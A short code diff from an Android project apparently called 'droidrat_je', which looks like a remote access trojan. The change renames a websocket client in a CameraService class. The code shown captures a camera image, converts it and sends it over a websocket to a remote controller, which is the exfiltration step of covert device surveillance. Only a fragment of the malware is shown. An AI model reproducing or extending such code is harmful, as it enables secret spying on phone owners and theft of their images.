@@ -34,7 +34,7 @@ import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.util.Collections;
 
-import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;
+import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;
 
 public class CameraService extends Service {
 
@@ -208,8 +208,8 @@ public class CameraService extends Service {
             } finally {
                 image.close(); // close this to free up buffer for other images
                 Bitmap bitmap = BitmapFactory.decodeFile(file.getPath());
-                if (bitmap != null && websockets != null)
-                    websockets.send("Camera " + ImageUtil.convert(bitmap) + "\n");
+                if (bitmap != null && droidRatWebSocketClient != null)
+                    droidRatWebSocketClient.send("Camera " + ImageUtil.convert(bitmap) + "\n");
                 if (null != output) {
                     try {
                         output.close();
